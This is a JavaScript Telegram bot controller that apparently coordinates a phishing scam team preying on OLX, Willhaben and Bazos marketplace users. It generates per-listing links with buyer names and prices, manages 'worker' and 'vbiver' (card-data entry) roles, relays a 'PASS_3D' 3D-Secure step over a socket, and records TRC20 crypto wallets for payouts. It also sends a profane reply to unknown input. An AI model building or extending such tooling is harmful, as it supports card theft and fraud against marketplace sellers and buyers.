import BotAPI from 'node-telegram-bot-api';
import fetch from "node-fetch";
import { 
    MARKET_NAMES, 
    COUNTRIES_NAMES, 
    SERVER_URL, 
    REQUEST_UI_CONTROL_EVENTS, 
    MAIN_MENU_UI_CONTROLS_EVENT, 
    TOKEN,
    NEW_USER_REPLY,
    ADMINS_CHOOSE,
    SEQUE_SCREEN_OPTIONS,
    SETTINGS_EVENTS,
    USER_ROLES,
    BOT_TEAM_NAME
} from './src/constants.js';
import UIManager from './src/UIManager.js';
import OLXFlowController from './src/markets/olx/olxFlowController.js';
import WillhabenFlowController from './src/markets/willhaben/willhabenFlowController.js';
import BazosFlowController from './src/markets/bazos/bazosFlowController.js';
import { getMarketList } from './src/utils.js';
import { io } from "socket.io-client";

class BotController {
    constructor(token) {
        this.bot = new BotAPI(token, { polling: true });
        this.commandList = [
            { command: '/start', description: 'start bot' }
        ];
        this.selectedMarketFlow = null;
        this.linkData = {};
        this.selectedMarket = '';
        this.selectedCountry = '';
        this.trc20WalletDataAwait = false;
        this.notificationMessageAwait = false;
        this.userData = {};
        this.MARKET_LIST = [];
        this.onMessageHandler = this.onMessageHandler.bind(this);
    }

    init() {
        this.bot.setMyCommands(this.commandList)
        this.addEventListeners()
        UIManager.init(this.bot)
    }

    startWork(msg) {
        this.clean();
        this.addEventListeners()
        const chatId = msg.chat.id;
        this.socket = io(SERVER_URL);
        this.authUser(msg).then(data => {
            if (data.type == "whaitlist") {
                UIManager.whaitListResponce(chatId);
            }
            else if (data.type === USER_ROLES.ADMIN || data.type === USER_ROLES.WORKER || data.type === USER_ROLES.VBIVER) {
                this.socket.emit('new-user', {chatId: chatId.toString()});
                UIManager.mainMenu(chatId, this.userData, data.type);
            }
            else if (data.type === USER_ROLES.REJECTED) {
                this.bot.sendMessage(chatId, 'Вашу заявку не приняли');
            }
            else {
                this.initNewUserFlow(msg.chat);
            }
        });
    }

    async authUser(msg) {
        this.userData = await fetch(SERVER_URL + '/auth', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({...msg.chat, teamName: BOT_TEAM_NAME})
        })
        .then(response => {
            return response.json()
        })
        .then(data => {
            return data
        })
        return this.userData;
    }

    initNewUserFlow(chat) {
        const chatId = chat.id;
        UIManager.newUser(chatId, chat);
    }

    async newUserRequest(chatData) {
        const adminsData = await fetch(SERVER_URL + '/askForNewUser', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({...chatData, teamName: BOT_TEAM_NAME})
        }).then(response => {
            return response.json()
        }).then(data => {
            return data
        })
        adminsData.forEach(element => {
            UIManager.adminAskForApprove(element.id, chatData);
        });
    }

    async approveNewUser(id, type) {
        const userData = await fetch(SERVER_URL + '/approveNewUser', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({id, type, teamName: BOT_TEAM_NAME})
        }).then(response => {
            return response.json()
        }).then(data => {
            return data
        })
        UIManager.approveMessage(id, userData.type)
    }

    addEventListeners() {
        this.bot.on('message', this.onMessageHandler);

        this.bot.on('callback_query', query => {
            const chatId = query.message.chat.id;
            if (typeof (query.data) === "string") {
                let dataParam = null;
                if (query.data.includes(ADMINS_CHOOSE.ADMINS_NEW_WORKER)) {
                    let separateChatId = [...query.data.matchAll(/(ADMINS_NEW_WORKER)(.*)/gm)];
                    query.data = separateChatId[0][1];
                    dataParam = separateChatId[0][2];
                }
                if (query.data.includes(ADMINS_CHOOSE.ADMINS_NEW_ADMIN)) {
                    let separateChatId = [...query.data.matchAll(/(ADMINS_NEW_ADMIN)(.*)/gm)];
                    query.data = separateChatId[0][1];
                    dataParam = separateChatId[0][2];
                }
                if (query.data.includes(MAIN_MENU_UI_CONTROLS_EVENT.SELECTED_LINK)) {
                    let separateChatId = [...query.data.matchAll(/(SELECTED_LINK)(.*)/gm)];
                    query.data = separateChatId[0][1];
                    dataParam = separateChatId[0][2];
                }
                if (query.data.includes(MAIN_MENU_UI_CONTROLS_EVENT.REMOVE_LINK)) {
                    let separateChatId = [...query.data.matchAll(/(REMOVE_LINK)(.*)/gm)];
                    query.data = separateChatId[0][1];
                    dataParam = separateChatId[0][2];
                }
                switch (query.data) {
                    case NEW_USER_REPLY.YES:
                        this.newUserRequest(query.message.chat);
                        UIManager.newUserAccept(chatId);
                        break;
                    case NEW_USER_REPLY.NO:
                        UIManager.newUserDecline(chatId);
                        break;   
                    case REQUEST_UI_CONTROL_EVENTS.CHANGE_NAME:
                        this.selectedMarketFlow.buyerDataEditNameAwait = true;
                        UIManager.requestDataEdit(chatId, query.data)
                        break;
                    case REQUEST_UI_CONTROL_EVENTS.CHANGE_PRICE:
                        this.selectedMarketFlow.buyerDataEditPriceAwait = true;
                        UIManager.requestDataEdit(chatId, query.data)
                        break;
                    case REQUEST_UI_CONTROL_EVENTS.LINK1:
                        break;
                    case REQUEST_UI_CONTROL_EVENTS.LINK2:
                        break;
                    case REQUEST_UI_CONTROL_EVENTS.MY_LINKS:
                        this.requestMyLinks(chatId);
                        break;
                    case REQUEST_UI_CONTROL_EVENTS.NOTIFICATION:
                        this.notificationMessageAwait = true;
                        UIManager.notifyMessageAwait(chatId)
                        break;
                    case REQUEST_UI_CONTROL_EVENTS.MAIN_MENU:
                        UIManager.mainMenu(chatId, this.userData, this.userData.type);
                        break;
                    case MAIN_MENU_UI_CONTROLS_EVENT.CREATE_LINK:
                        UIManager.countrySelector(chatId);
                        break;
                    case MAIN_MENU_UI_CONTROLS_EVENT.SETTINGS:
                        UIManager.settingsMenu(chatId, this.userData);
                        break;
                    case MAIN_MENU_UI_CONTROLS_EVENT.SELECTED_LINK:
                        const linkData = this.userData.links[dataParam];
                        this.selectedCountry = linkData.selectedCountry;
                        this.selectedMarket = linkData.selectedMarket
                        this.selectMarketFlow(linkData.selectedMarket, chatId, linkData);
                        this.selectedMarketFlow.selectedCountry = linkData.selectedCountry;
                        this.selectedMarketFlow.selectedMarket = linkData.selectedMarket;
                        this.selectedMarketFlow.productData = {
                            name: linkData.staffName,
                            price: linkData.price,
                            image: linkData.staffImgURL
                        }
                        this.selectedMarketFlow.buyerName = linkData.buyerName;
                        this.selectedMarketFlow.buyerLocation = linkData.buyerLocation;
                        this.selectedMarketFlow.generateMarketControls(chatId, linkData)
                        break;
                    case MAIN_MENU_UI_CONTROLS_EVENT.REMOVE_LINK:
                        const linkID = dataParam;
                        this.removeLinkFromAccount(chatId, linkID);
                        break;
                    case MAIN_MENU_UI_CONTROLS_EVENT.USERS_LIST:
                        this.getUsersList().then(usersList => {
                            console.log(usersList);
                            UIManager.usersListUI(chatId, usersList);
                        });
                        break;
                    case MAIN_MENU_UI_CONTROLS_EVENT.WORKERS_LIST:
                        this.getRoleList(USER_ROLES.WORKER).then(workersList => {
                            UIManager.workersListUI(chatId, workersList);
                        });
                        break;
                    case MAIN_MENU_UI_CONTROLS_EVENT.VBIVERS_LIST:
                        this.getRoleList(USER_ROLES.VBIVER).then(workersList => {
                            UIManager.vbiversListUI(chatId, workersList);
                        });
                        break;
                    case SEQUE_SCREEN_OPTIONS.PASS_3D:
                        console.log(SEQUE_SCREEN_OPTIONS.PASS_3D, chatId, this.socket);
                        this.socket.emit(SEQUE_SCREEN_OPTIONS.PASS_3D, chatId)
                        break;
                    case ADMINS_CHOOSE.ADMINS_NEW_ADMIN:
                        this.approveNewUser(dataParam, USER_ROLES.ADMIN);
                        break;
                    case ADMINS_CHOOSE.ADMINS_NEW_WORKER_REJECT:
                        this.approveNewUser(dataParam, USER_ROLES.REJECTED);
                        break;
                    case SETTINGS_EVENTS.LINK_NEW_TRC_20:
                        UIManager.requestTRC20Wallet(chatId);
                        this.trc20WalletDataAwait = true;
                        break;
                    case ADMINS_CHOOSE.ADMINS_NEW_WORKER:
                        this.approveNewUser(dataParam, USER_ROLES.WORKER);
                        break; 
                    case ADMINS_CHOOSE.ADMINS_NEW_VBIVER:
                        this.approveNewUser(dataParam, USER_ROLES.VBIVER);
                        break; 
                    case this.MARKET_LIST.find((el) => query.data === el):
                        this.marketSelectedHandler(query);
                        break;
                    case COUNTRIES_NAMES.find((el) => query.data === el):
                        this.countrySelectedHandler(query)
                        break;
                    default:
                        this.bot.sendMessage(chatId, "Выберите корректную кнопку");
                        break;
                }
            }
        })
    }

    onMessageHandler(msg) {
        const chatId = msg.chat.id;
        const text = msg.text;
        const photo = msg.photo;
        if (text === "/start") {
            return this.startWork(msg);
        }
        if (msg.reply_to_message && this.selectedMarketFlow) {
            this.socket.emit('send-telega-message', msg.text);
            return true;
        }

        if (this.trc20WalletDataAwait) {
            this.updateTRC20WalletData(text);
            return true;
        }

        if (this.notificationMessageAwait) {
            this.notificationMessageAwait = false;
            this.notifyUsers(text);
            return true;
        }

        if (this.selectedMarketFlow) {
            this.selectedMarketFlow.onMessage(text || photo, chatId)
            return true;
        }

        this.bot.sendMessage(chatId, 'I don`t understand you motherfucker');
    }

    async getUsersList() {
        const usersList = await fetch(SERVER_URL + `/usersList?teamName=${BOT_TEAM_NAME}`)
        .then(response => {
            return response.json()
        }).then(data => {
            return data;
        })
        return usersList;
    }

    async getRoleList(role) {
        const roleList = await this.getUsersList().then(roleList => {
            const roleListArray = [];
            for (const key in roleList) {
                const el = roleList[key];
                if (el.type === role) {
                    roleListArray.push(el);
                }
            }
            return roleListArray;
        })
        return roleList;
    }

    async notifyUsers(text) {
        this.getUsersList().then(usersList => {
            for (const key in usersList) {
                const user = usersList[key];
                this.bot.sendMessage(user.id, text);
            }
        })
    }

    onRemoveButtonPressed(chatId) {
        UIManager.onRemoveButtonHandled(chatId);
    }

    onBackToMainMenuHandled(chatId) {
        this.startWork(chatId);
    }

    async updateTRC20WalletData(walletData) {
        const userData = await fetch(SERVER_URL + '/updateTRC20Wallet', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({id: this.userData.id, walletData, teamName: BOT_TEAM_NAME})
        }).then(response => {
            return response.json()
        }).then(data => {
            return data;
        })
        this.userData = userData;
        UIManager.updateDataCompleate(this.userData.id);
    }

    async requestMyLinks(id) {
        const myLinks = await fetch(SERVER_URL + '/myLinks', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({id, teamName: BOT_TEAM_NAME})
        }).then(response => {
            return response.json()
        }).then(data => {
            return data;
        })
        this.userData.links = myLinks;
        UIManager.linksList(id, myLinks);
    }

    marketSelectedHandler(callBackData) {
        const chatId = callBackData.message.chat.id;
        const marketInputName = callBackData.data;
        this.MARKET_LIST.forEach(element => {
            if (element === marketInputName) {
                this.selectMarketFlow(element, chatId);
                this.selectedMarketFlow.start();
            }
        });

    }

    async removeLinkFromAccount(chatId, linkId) {
        await fetch(SERVER_URL + '/myLinks', {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({userId: chatId, linkId, teamName: BOT_TEAM_NAME})
        }).then(response => {
            return response.json()
        }).then(data => {
            this.requestMyLinks(chatId);
            this.onRemoveButtonPressed(chatId);
        })
    }

    selectMarketFlow(marketName, chatId, linkData) {
        this.selectedMarket = marketName;
        switch (marketName) {
            case MARKET_NAMES.OLX:
                this.selectedMarketFlow = new OLXFlowController(this.bot, chatId, this.selectedMarket, this.selectedCountry, linkData);
                break;
            case MARKET_NAMES.WILLHABEN:
                this.selectedMarketFlow = new WillhabenFlowController(this.bot, chatId, this.selectedMarket, this.selectedCountry, linkData);
                break;
            case MARKET_NAMES.BAZOS:
                this.selectedMarketFlow = new BazosFlowController(this.bot, chatId, this.selectedMarket, this.selectedCountry, linkData);
                break;
            default:
                this.bot.sendMessage(chatId, "маркет не найден");
        }
    }

    countrySelectedHandler(callBackData) {
        const chatId = callBackData.message.chat.id;
        const countryInputName = callBackData.data;
        this.MARKET_LIST = getMarketList(countryInputName);
        COUNTRIES_NAMES.forEach(element => {
            if (element === countryInputName) {
                this.selectedCountry = element;
                UIManager.marketSelector(chatId, this.selectedCountry, this.MARKET_LIST);
            }
        });
    }

    clean() {
        this.selectedCountry = '';
        this.selectedMarket = '';
        this.selectedMarketFlow = null;
        this.bot.removeAllListeners();
        this.MARKET_LIST = [];
    }

}

const botController = new BotController(TOKEN);
botController.init()